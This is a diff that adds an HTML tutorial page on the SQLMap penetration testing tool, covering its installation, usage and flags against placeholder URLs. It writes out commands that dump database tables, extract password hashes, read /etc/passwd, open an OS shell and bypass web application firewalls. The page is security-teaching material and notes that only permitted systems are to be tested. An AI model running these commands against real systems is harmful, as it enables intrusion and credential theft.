@@ -1,0 +1,199 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>SQLMap Tool</title>
+    <link rel="stylesheet" href="sqlmap.css">
+    
+</head>
+<body>
+    <header>
+        <h1>Penetration Testing : SQLMap</h1>
+    </header>
+    <nav class="navbar">
+        <div class="navbar-container">
+            <a href="#" class="navbar-logo">PenTest Tools</a>
+            <button class="navbar-toggle">☰</button>
+            <ul class="navbar-menu">
+                <li class="navbar-item"><a href="/test.html" class="navbar-link">Cybersecurity</a></li>
+                <li class="navbar-item"><a href="/test.html" class="navbar-link">Penetration Testing</a></li>
+                <li class="navbar-item"><a href="/Navbar/tools.html" class="navbar-link">Tools</a></li>
+                <li class="navbar-item"><a href="/Navbar/about.html" class="navbar-link">About</a></li>
+                <li class="navbar-item"><a href="#contact" class="navbar-link">Contact</a></li>
+            </ul>
+        </div>
+    </nav>
+<main>
+    <section id="about">
+        <h2>About SQLMap</h2>
+        <p>SQLMap is an open-source penetration testing tool that automates the process of detecting and exploiting SQL injection flaws. It comes with a powerful detection engine and many features for the ultimate penetration tester.</p>
+        
+        <h3>Key Features</h3>
+        <ul>
+            <li>Full support for various SQL injection techniques</li>
+            <li>Database fingerprinting</li>
+            <li>Data extraction from the database</li>
+            <li>Access to underlying file system</li>
+            <li>Command execution on the operating system</li>
+            <li>Support for multiple database management systems</li>
+        </ul>
+
+        <h3>Supported Databases</h3>
+        <ul>
+            <li>MySQL</li>
+            <li>Oracle</li>
+            <li>PostgreSQL</li>
+            <li>Microsoft SQL Server</li>
+            <li>SQLite</li>
+            <li>IBM DB2</li>
+            <li>And many others...</li>
+        </ul>
+    </section>
+
+    <section id="installation">
+        <h2>Installation</h2>
+        <h3>Using Git</h3>
+        <div class="code-block">
+            <code>git clone --depth 1 https://github.com/sqlmapproject/sqlmap.git sqlmap-dev</code>
+        </div>
+
+        <h3>Using Python pip</h3>
+        <div class="code-block">
+            <code>pip install sqlmap</code>
+        </div>
+
+        <h3>On Kali Linux</h3>
+        <div class="code-block">
+            <code>sudo apt update && sudo apt install sqlmap</code>
+        </div>
+    </section>
+
+    <section id="basic-usage">
+        <h2>Basic Usage Guide</h2>
+
+        <h3>1. Basic URL Scan</h3>
+        <div class="code-block">
+            <p>Test a URL for SQL injection:</p>
+            <code>sqlmap -u "http://example.com/page.php?id=1"</code>
+        </div>
+
+        <h3>2. POST Request Testing</h3>
+        <div class="code-block">
+            <p>Test POST parameters:</p>
+            <code>sqlmap -u "http://example.com/login.php" --data="username=admin&password=admin"</code>
+        </div>
+
+        <h3>3. Using Request File</h3>
+        <div class="code-block">
+            <p>Test using a captured request:</p>
+            <code>sqlmap -r request.txt</code>
+        </div>
+    </section>
+
+    <section id="advanced-usage">
+        <h2>Advanced Usage</h2>
+
+        <h3>1. Database Enumeration</h3>
+        <div class="code-block">
+            <p>List available databases:</p>
+            <code>sqlmap -u "URL" --dbs</code>
+            <p>List tables in a database:</p>
+            <code>sqlmap -u "URL" -D database_name --tables</code>
+            <p>Dump table contents:</p>
+            <code>sqlmap -u "URL" -D database_name -T table_name --dump</code>
+        </div>
+
+        <h3>2. Advanced Options</h3>
+        <div class="code-block">
+            <ul>
+                <li>Use DBMS authentication:
+                    <code>sqlmap -u "URL" --dbms=mysql --user=root --password=root</code>
+                </li>
+                <li>Specify injection technique:
+                    <code>sqlmap -u "URL" --technique=BEUSTQ</code>
+                </li>
+                <li>Use a specific parameter:
+                    <code>sqlmap -u "URL" -p username</code>
+                </li>
+            </ul>
+        </div>
+
+        <h3>3. OS Command Execution</h3>
+        <div class="code-block">
+            <p>Execute OS commands:</p>
+            <code>sqlmap -u "URL" --os-shell</code>
+            <p>Get OS command prompt:</p>
+            <code>sqlmap -u "URL" --os-cmd=whoami</code>
+        </div>
+    </section>
+
+    <section id="practical-examples">
+        <h2>Practical Examples</h2>
+        
+        <h3>Testing Authentication Bypass</h3>
+        <div class="code-block">
+            <code>sqlmap -u "http://example.com/login.php" --data="user=admin&password=admin" --level=5 --risk=3</code>
+        </div>
+
+        <h3>Extracting Password Hashes</h3>
+        <div class="code-block">
+            <code>sqlmap -u "URL" --passwords --batch</code>
+        </div>
+
+        <h3>File System Access</h3>
+        <div class="code-block">
+            <code>sqlmap -u "URL" --file-read="/etc/passwd"</code>
+        </div>
+    </section>
+
+    <section id="best-practices">
+        <h2>Best Practices</h2>
+        <ul>
+            <li><strong>Legal Compliance:</strong> Only test systems you have permission to test</li>
+            <li><strong>Performance:</strong> Start with basic options and gradually increase complexity</li>
+            <li><strong>Accuracy:</strong> Use --batch for automated runs, but verify results manually</li>
+            <li><strong>Documentation:</strong> Keep logs of all testing sessions</li>
+            <li><strong>Risk Management:</strong> Be cautious with high-risk options that might damage the target</li>
+        </ul>
+    </section>
+
+    <section id="troubleshooting">
+        <h2>Common Issues and Solutions</h2>
+        <ul>
+            <li><strong>False Positives:</strong> Use --level and --risk parameters to adjust testing depth</li>
+            <li><strong>WAF Detection:</strong> Use --tamper scripts to bypass security measures</li>
+            <li><strong>Connection Issues:</strong> Adjust --timeout and --delay parameters</li>
+            <li><strong>Performance:</strong> Use --threads for faster scanning</li>
+        </ul>
+    </section>
+
+    <section id="important-flags">
+        <h2>Important SQLMap Flags</h2>
+        <div class="code-block">
+            <ul>
+                <li><code>--random-agent</code>: Use random User-Agent</li>
+                <li><code>--batch</code>: Never ask for user input</li>
+                <li><code>--risk=3</code>: Higher risk of detection</li>
+                <li><code>--level=5</code>: Higher level of tests</li>
+                <li><code>--proxy</code>: Use a proxy for requests</li>
+                <li><code>--tamper</code>: Use tamper scripts</li>
+            </ul>
+        </div>
+    </section>
+</main>
+<footer>
+    <p>&copy; 2024 Cybersecurity and Penetration Testing Resource. All rights reserved.</p>
+    <p>Developed by <a href="#" target="_blank">Your Organization</a></p>
+    <p><a href="#" target="_blank">Privacy Policy</a> | <a href="#" target="_blank">Terms of Service</a></p>
+</footer>
+<script>
+    const navbarToggle = document.querySelector('.navbar-toggle');
+    const navbarMenu = document.querySelector('.navbar-menu');
+
+    navbarToggle.addEventListener('click', () => {
+        navbarMenu.classList.toggle('active');
+    });
+</script>
+</body>
+</html>
